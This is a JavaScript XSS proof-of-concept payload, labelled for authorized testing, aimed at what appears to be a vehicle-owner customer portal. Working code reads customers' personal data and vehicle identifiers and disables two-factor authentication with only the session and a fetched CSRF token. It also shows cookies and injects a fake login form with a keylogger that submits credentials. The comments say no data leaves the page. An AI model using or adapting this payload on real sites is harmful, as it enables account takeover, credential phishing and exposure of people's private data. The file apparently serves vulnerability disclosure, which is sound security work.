/*
 * xss-demo.js — SECURITY DEMO (authorized testing only)
 *
 * Generic demonstration payload for an authorized XSS proof-of-concept.
 * It proves that externally hosted JavaScript can:
 *  - show session data when the visitor is logged in
 *  - toggle a security setting (2FA) with an explicit confirmation
 *  - display cookie/CSRF visibility (HttpOnly tokens must stay hidden)
 *  - render a demo login form with a local keylogger when logged out
 *
 * No data leaves the page and nothing is stored.
 */
(function () {
  'use strict';
  if (window.__DEMO_POC__) return;
  window.__DEMO_POC__ = true;

  var WARN = 'SECURITY DEMO — authorized testing only. No data is sent anywhere.';

  function el(tag, attrs, text) {
    var e = document.createElement(tag);
    if (attrs) for (var k in attrs) e.setAttribute(k, attrs[k]);
    if (text != null) e.textContent = text;
    return e;
  }
  function get(url) {
    return fetch(url, { credentials: 'same-origin', headers: { 'X-Requested-With': 'XMLHttpRequest' } })
      .then(function (r) { return r.text().then(function (t) { return { status: r.status, body: t }; }); });
  }
  function b64decode(s) {
    try { return decodeURIComponent(escape(atob(s))); } catch (e) { return s; }
  }
  function uniq(a) { return a.filter(function (v, i) { return a.indexOf(v) === i; }); }
  function csrf() {
    try { return (window.ACC && ACC.config && ACC.config.CSRFToken) || ''; } catch (e) { return ''; }
  }

  var host = el('div', { style: 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif' });
  var shadow = host.attachShadow ? host.attachShadow({ mode: 'open' }) : host;

  var box = el('div', { style: 'width:min(760px,92vw);max-height:88vh;overflow:auto;background:#fff;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.4);color:#1f2328' });
  var head = el('div', { style: 'padding:14px 18px;border-bottom:1px solid #e5e7eb;display:flex;justify-content:space-between;align-items:center;gap:12px' });
  head.appendChild(el('div', { style: 'font-weight:700;font-size:15px' }, 'Security Demo (XSS PoC)'));
  var closeBtn = el('button', { style: 'border:0;background:#111;color:#fff;border-radius:8px;padding:8px 12px;cursor:pointer' }, 'Close');
  closeBtn.onclick = function () { host.remove(); };
  head.appendChild(closeBtn);

  var warn = el('div', { style: 'margin:12px 18px;padding:10px 12px;background:#fff4e5;border-left:4px solid #b35900;border-radius:6px;font-size:12.5px;color:#7a3d00' }, WARN);
  var body = el('div', { style: 'padding:0 18px 18px' });
  var out = el('pre', { style: 'background:#0d1117;color:#e6edf3;padding:12px;border-radius:8px;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:300px;overflow:auto;margin:12px 0 0' }, '');
  var actions = el('div', { style: 'display:flex;flex-wrap:wrap;gap:8px;margin-top:12px' });
  function btn(label, fn, danger) {
    var b = el('button', {
      style: 'border:1px solid ' + (danger ? '#cf222e' : '#d0d7de') + ';background:' + (danger ? '#cf222e' : '#f6f8fa') + ';color:' + (danger ? '#fff' : '#1f2328') + ';border-radius:8px;padding:9px 12px;font-size:13px;cursor:pointer'
    }, label);
    b.onclick = function () { fn(b); };
    actions.appendChild(b);
    return b;
  }
  function say(s) { out.textContent = typeof s === 'string' ? s : JSON.stringify(s, null, 2); }

  box.appendChild(head); box.appendChild(warn); box.appendChild(body);
  body.appendChild(actions); body.appendChild(out);
  shadow.appendChild(box);
  document.documentElement.appendChild(host);

  function showPersonal() {
    say('Loading…');
    Promise.all([get('/get-current-customer'), get('/base64-data'), get('/my-account/my-vehicles')]).then(function (r) {
      var cust = {}, b64 = {};
      try { cust = JSON.parse(r[0].body); } catch (e) {}
      try { b64 = JSON.parse(r[1].body); } catch (e) {}
      var html = r[2].body || '';
      var ids = [], m, re = /set-primary-vehicle\?id=([A-Za-z0-9]+)/g;
      while ((m = re.exec(html))) ids.push(m[1]);
      ids = uniq(ids).slice(0, 3);
      var base = {
        uid: cust.uid, name: cust.name, phone: cust.customerPhone,
        email_b64: b64.userEmail, email: b64.userEmail ? b64decode(b64.userEmail) : null,
        name_b64: b64.userName, name_decoded: b64.userName ? b64decode(b64.userName) : null,
        phone_b64: b64.userPhoneNo, phone_decoded: b64.userPhoneNo ? b64decode(b64.userPhoneNo) : null,
        csrfToken: csrf()
      };
      if (!ids.length) {
        base.vehicles = { note: 'vehicleId not found in the account page HTML', engines: uniq(html.match(/JM02E-\d+/g) || []), vins: uniq(html.match(/MH1[A-Z0-9]{10,}/g) || []) };
        say(base);
        return;
      }
      Promise.all(ids.map(function (id) {
        return get('/get-customer-vehicle?id=' + encodeURIComponent(id)).then(function (x) {
          try { return JSON.parse(x.body); } catch (e) { return { id: id, httpStatus: x.status, raw: String(x.body).slice(0, 200) }; }
        });
      })).then(function (vehicles) { base.vehicles = vehicles; say(base); })
        .catch(function (e) { base.vehicles = { error: String(e) }; say(base); });
    }).catch(function (e) { say('Failed: ' + e); });
  }

  function showState() {
    say('Loading security state…');
    get('/my-account/security/2fa').then(function (r) {
      var m = (r.body || '').match(/currentTwoFAState[^>]*value="([^"]+)"/);
      say({ httpStatus: r.status, currentTwoFAState: m ? m[1] : 'not found', note: 'Value read from the visitor account page.' });
    }).catch(function (e) { say('Failed: ' + e); });
  }

  function disable2fa() {
    if (!confirm('DEMO: disable 2FA on the currently logged-in account. Continue?')) return;
    get('/csrf').then(function (r) {
      var t = (r.body || '').replace(/"/g, '');
      return fetch('/my-account/security/2fa', {
        method: 'PUT',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json', 'CSRFToken': t, 'X-Requested-With': 'XMLHttpRequest' },
        body: JSON.stringify({ isMFAEnabled: 'false' })
      }).then(function (x) { return x.text().then(function (b) { return { status: x.status, body: b }; }); });
    }).then(function (res) {
      say({ action: 'PUT /my-account/security/2fa', result: res, note: 'Only session + CSRF required; no password/TOTP.' });
    }).catch(function (e) { say('Failed: ' + e); });
  }

  function showCookies() {
    say({
      document_cookie: document.cookie || '(empty)',
      note: 'Session tokens are HttpOnly and must NOT appear here.',
      csrfToken: csrf(),
      userAgent: navigator.userAgent
    });
  }

  function phishingPanel() {
    actions.style.display = 'none';
    say('');
    var form = el('form', { style: 'margin-top:8px;display:grid;gap:8px;max-width:380px' });
    var u = el('input', { placeholder: 'Username / Phone', autocomplete: 'off', style: 'padding:10px;border:1px solid #d0d7de;border-radius:8px' });
    var p = el('input', { placeholder: 'Password', type: 'password', autocomplete: 'off', style: 'padding:10px;border:1px solid #d0d7de;border-radius:8px' });
    var log = el('div', { style: 'background:#fff8c5;border:1px solid #eac54f;border-radius:8px;padding:10px;font-size:12px;white-space:pre-wrap;min-height:44px' }, 'Keylogger demo: keystrokes render here locally (never sent anywhere).');
    var keys = [];
    function key(ev) {
      keys.push({ field: ev.target === u ? 'username' : 'password', key: ev.key, value: ev.target.value, at: Date.now() });
      if (keys.length > 40) keys.shift();
      log.textContent = 'Keylogger demo (' + keys.length + ' local events):\n' + keys.map(function (k) { return k.field + ' | ' + k.key + ' | value: ' + k.value; }).join('\n');
    }
    u.addEventListener('keydown', key); p.addEventListener('keydown', key);
    form.appendChild(u); form.appendChild(p);
    form.appendChild(el('button', { type: 'submit', style: 'padding:10px;border:0;border-radius:8px;background:#111;color:#fff;cursor:pointer' }, 'Sign in (demo)'));
    form.addEventListener('submit', function (ev) {
      ev.preventDefault();
      var payload = 'username=' + encodeURIComponent(u.value) + '&password=' + encodeURIComponent(btoa(p.value)) + '&action=login&CSRFToken=' + encodeURIComponent(csrf());
      fetch('/login/ajax', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: payload })
        .then(function (r) { return r.text(); })
        .then(function (txt) {
          say({ captured: { username: u.value, password: p.value }, login_ajax_response: txt, keyEvents: keys.length, note: 'Values are rendered on-page only (demo).' });
        }).catch(function (e) { say('Failed: ' + e); });
    });
    form.appendChild(log);
    body.insertBefore(form, out);
  }

  function build() {
    get('/get-current-customer').then(function (r) {
      var cust = {};
      try { cust = JSON.parse(r.body); } catch (e) {}
      var loggedIn = cust && cust.uid && cust.uid !== 'anonymous';
      if (loggedIn) {
        say('Session detected: ' + (cust.name || cust.uid));
        btn('Show personal data', showPersonal);
        btn('2FA status', showState);
        btn('Disable 2FA', disable2fa, true);
        btn('Show cookies & CSRF', showCookies);
        btn('Reload data', showPersonal);
      } else {
        say('No session detected — demo login form available.');
        btn('Show cookies & CSRF', showCookies);
        btn('Show login form (demo)', phishingPanel);
      }
    }).catch(function () {
      say('Could not confirm session state; showing demo login form.');
      btn('Show login form (demo)', phishingPanel);
    });
  }

  build();
})();
